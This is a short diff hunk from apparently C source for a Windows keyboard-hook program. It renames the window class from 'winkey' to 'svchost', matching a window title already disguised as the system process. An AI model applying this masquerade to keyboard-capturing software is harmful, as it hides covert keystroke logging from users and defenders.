@@ -5,7 +5,7 @@
 
 #define	DEBUG	1
 
-#define CLASSNAME	"winkey"
+#define CLASSNAME	"svchost"
 #define WINDOWTITLE	"svchost"
 
 HHOOK	kbdhook;	/* Keyboard hook handle */
